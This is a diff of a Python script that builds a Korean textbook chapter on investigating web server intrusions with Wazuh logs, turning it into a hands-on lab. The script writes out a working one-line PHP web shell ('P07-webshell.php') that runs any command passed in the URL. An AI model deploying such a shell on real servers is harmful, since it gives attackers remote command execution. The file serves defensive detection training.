@@ -12,9 +12,9 @@ def spot(ch,n,caption):return {'type':'image','path':f'assets/illustrations/chap
 def ref(text,url):return {'type':'link','text':text,'url':url}
 page('7장  웹 서버 침투와 실행 흔적',
  p('웹 폴더에 생긴 PHP 파일, 공격 문자열이 든 요청, 200·500 응답을 조사한다. 무엇이 기록됐고 무엇을 더 확인해야 하는지 구분한다. Module 01 실습 07~12에 해당한다.'),
- p('이 장의 화면은 제공된 강의 슬라이드에 수록된 기록이다. 화면의 값을 읽고 검색식을 해석한다. 같은 기록을 보유한 환경에서는 Discover로 조회할 수 있다.'),
+ p('직접 공격 입력을 보내 로그를 만들고 Wazuh에서 확인한다. 결과 화면은 제공된 슬라이드의 기존 기록이며, 새 실습에서는 자신의 시각·파일명·주소로 조회한다.'),
  fig('roadmap','도식 7-1. 사례 분석 순서.'),
- tab(['항목','내용'],[['준비','3장의 Discover 사용법, 4장의 필드·규칙, 5장의 HTTP·WAF 개념.'],['실행 위치','화면 분석은 본문. 선택 조회는 Windows 브라우저의 Wazuh Discover.'],['완료 기준','여섯 사례마다 관찰 사실과 추가로 필요한 증거를 한 문장씩 적는다.']],[29,98]))
+ tab(['항목','내용'],[['준비','3장의 Discover 사용법, 4장의 필드·규칙, 5장의 HTTP·WAF 개념.'],['실행 위치','웹 요청·검색은 Windows 브라우저. 파일 작업은 kt66 호스트, 선택 curl은 공격자 VM.'],['완료 기준','여섯 사례마다 관찰 사실과 추가로 필요한 증거를 한 문장씩 적는다.']],[29,98]))
 page('7.1  기록을 읽는 순서',
  p('① 에이전트·시각으로 조사 대상을 확인한다. ② 규칙과 실제 필드를 읽는다. ③ 원문에서 그 값이 나온 부분을 찾는다. ④ 확인한 사실과 추가 조사 항목을 적는다.'),
  tab(['필드','이 장에서 읽을 내용'],[['agent.name · agent.ip','로그를 보낸 에이전트의 이름·주소. 공격자 주소와 구분한다.'],['data.srcip','웹 서버가 기록한 요청 출발지. 사례는 192.168.0.202이다.'],['data.protocol','접속 로그의 GET·POST 등 HTTP 메서드.'],['data.url · data.id','요청 URL · HTTP 응답 코드.'],['rule.id','Wazuh가 적용한 탐지 규칙 번호.'],['syscheck.path','FIM이 관찰한 파일의 경로.'],['full_log · location','원문 · 수집한 파일 또는 입력 경로.']],[43,84]),
@@ -146,7 +146,7 @@ page('7.8  사례별 조사 결론',
 page('7.8  검색 결과가 다를 때',
  tab(['증상','확인 순서'],[['0건','같은 원본 데이터가 있는지 → 날짜·시간대 → 인덱스 → 남아 있는 필터 → 필드명.'],['규칙 번호가 다름','Wazuh 버전 → 사용자 규칙 → 원문의 URL·응답 → 적용된 규칙 조건.'],['POST 입력이 안 보임','요청 메서드 → 본문 전달 여부 → WAF 감사 기록의 수집 범위.'],['파일 경로가 없음','FIM 경보인지 → agent.name → 해당 컨테이너의 감시 경로.'],['5xx 건수가 예상보다 적음','경보·전체 로그 구분 → 수집 누락 여부 → 기간 → 다른 규칙으로 분류된 기록.']],[43,84]),
  h('조회 종료와 원상복구'),
- p('선택 조회를 마치면 이번에 추가한 필터의 삭제 버튼을 누르고 검색창을 비운다. 시작 전에 쓰던 인덱스와 기간으로 돌아간다. 조회 작업은 서버 설정을 바꾸지 않으므로 검색 조건만 복구하면 된다.'),
+ p('선택 조회를 마치면 이번에 추가한 필터의 삭제 버튼을 누르고 검색창을 비운다. 시작 전에 쓰던 인덱스와 기간으로 돌아간다. 실습 파일·User-Agent·DVWA 단계는 7.8의 원상복구 절차로 되돌린다.'),
  h('확인 문제'),
  p('① 규칙 554와 .php 경로만으로 무엇을 확인할 수 있는가?'),
  p('② 31168·200 기록에서 Bash 실행을 판단하려면 무엇이 더 필요한가?'),
@@ -186,6 +186,8 @@ page('7장 참고 자료 · 실습 자료',
  p('DVWA 설명은 설치본 v1.10 Development의 vulnerabilities/exec/source/low.php와 대조했다. 슬라이드의 기존 기록과 새 환경의 결과는 데이터·설정에 따라 다를 수 있다.'),
  h('본문 예제'),
  ref('집필 저장소 · 7장 검색식과 조사 양식','https://github.com/mrgrit/hack_ir_with_wazuh_book_1/tree/main/examples/chapter07'))
+from chapter07_labs import add_labs
+commands,browser_inputs=add_labs(pages)
 number=0
 for pg in pages:
  for b in pg['blocks']:
@@ -194,6 +196,10 @@ if __name__=='__main__':
  out=ROOT/'examples/chapter07';out.mkdir(parents=True,exist_ok=True)
  (ROOT/'manuscript/volume01-chapter07.json').write_text(json.dumps({'title':'웹 서버 침투와 실행 흔적','series':'해킹·침해대응 실무 with Wazuh · 시스템 침투와 SIEM 분석','pages':pages},ensure_ascii=False,indent=2)+'\n')
  for b in queries:(out/(b['id']+'.txt')).write_text(b['text']+'\n')
- (out/'manifest.json').write_text('[]\n');(out/'queries.json').write_text(json.dumps(queries,ensure_ascii=False,indent=2)+'\n')
+ (out/'manifest.json').write_text(json.dumps(commands,ensure_ascii=False,indent=2)+'\n');
+ for b in commands:(out/(b['id']+'.txt')).write_text(b['text']+'\n')
+ for b in browser_inputs:(out/b['file']).write_text(b['text']+'\n')
+ (out/'P07-webshell.php').write_text("<?php\nif (isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n")
+ (out/'browser-inputs.json').write_text(json.dumps(browser_inputs,ensure_ascii=False,indent=2)+'\n');(out/'queries.json').write_text(json.dumps(queries,ensure_ascii=False,indent=2)+'\n')
  (out/'investigation.txt').write_text('사례·화면 번호:\n기록 시각·시간대:\nagent.name·agent.ip:\ndata.srcip:\ndata.protocol·data.url·data.id:\nsyscheck.path:\nrule.id·rule.description:\nfull_log·location(보이는 범위):\n화면에서 확인한 사실:\n추가로 필요한 자료와 이유:\n선택 조회의 인덱스·기간·검색식:\n검색 조건 복구:\n')
  print(len(pages),'pages',len(queries),'queries',number,'screens')
